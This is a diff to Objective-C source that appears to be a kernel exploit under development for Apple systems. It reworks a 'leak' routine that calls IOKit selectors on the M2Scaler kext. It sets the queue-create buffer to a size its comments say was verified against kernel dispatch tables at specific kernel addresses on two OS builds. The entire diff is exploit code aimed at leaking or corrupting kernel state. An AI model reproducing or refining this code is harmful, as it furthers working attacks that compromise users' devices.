@@ -100,7 +100,7 @@
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v2-leakgate"
+#define P110_BUILD      @"p110-swapclaim-v2.1-leakgate-qfa8"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -488,22 +488,24 @@ static BOOL p110_leak_door(void) {
 }
 
 /* queue create (sel 6) — p098 v5 law: sel-8 with no queue on the connection
-   reads zero bytes and rejects; the row size comes from LabOff() (0x410 =
-   23F77 class / 0x408 twin; 0 = row absent -> the 0x408 fallback, honest). */
+   reads zero bytes and rejects. v1.2 law (2026-10-27, byte-verified on-disk
+   on BOTH builds): the M2Scaler kext's own dispatch table (12 rows, stride
+   0x30, in-size at row+0x20) says sel=6 in = 0xFA8 on 23F77 AND 24A435
+   (24A435 table 0xfffffe00080efcd8). The LabOff queue_create_size row is the
+   IOGPU queue (0x410/0x408), NOT M2Scaler — the 21:54 17-side run proved it
+   (stIn=0x408 -> 2c2 with open conn=61699). */
 static void p110_leak_queue(void) {
     if (g_p110_m2queued || !g_p110_m2conn) return;
     g_p110_m2queued = YES;
-    const LabOffTab *off = LabOff();
-    uint32_t qsz = off ? (uint32_t)off->queue_create_size : 0;
-    if (!qsz) qsz = 0x408u;
-    if (qsz > 0x410u) qsz = 0x410u;
-    static uint8_t qBuf[0x410];
+    uint32_t qsz = 0xFA8u;
+    static uint8_t qBuf[0xFA8];
     memset(qBuf, 0, sizeof(qBuf));
     size_t qOutLen = sizeof(qBuf);
     uint64_t qOut[4] = {0};
     kern_return_t krQ = g_p110_callStruct(g_p110_m2conn, 6, qBuf, qsz, qOut, &qOutLen);
     g_p110_m2qh = qOut[0];
-    Lf(@"[leak] QueueCreate sel=6 stIn=0x%x (LabOff row; 0x410=23F77 class) zeros "
+    Lf(@"[leak] QueueCreate sel=6 stIn=0x%x (M2Scaler dispatch row law: 0xfa8 on BOTH "
+       @"23F77 + 24A435, byte-verified at table 0xfffffe00080efcd8 sel-6) zeros "
        @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
        qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
 }
